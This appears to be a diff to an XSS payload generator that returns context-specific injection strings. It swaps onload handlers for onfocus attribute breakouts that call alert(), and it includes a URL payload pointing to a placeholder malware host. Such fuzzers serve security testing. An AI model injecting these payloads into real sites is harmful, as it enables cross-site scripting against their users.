@@ -108,9 +108,9 @@ def generate_payload(context):
         ]
         return random.choice(options)
     elif context == 'HTML_QUOTED':
-        return " \" onload=alert('HACKED AGAIN'); x=\""
+        return "xss\" onfocus=\"alert('HACKED AGAIN');"
     elif context == 'HTML_UNQUOTED':
-        return " onload=alert('XSSSSSSS');"
+        return "xss onfocus=alert('XSSSSSSS');"
     elif context == 'URL_START':
         return 'ftp://malware.net/h4xx0r_malware.exe'
     elif context == 'URL_GENERAL':
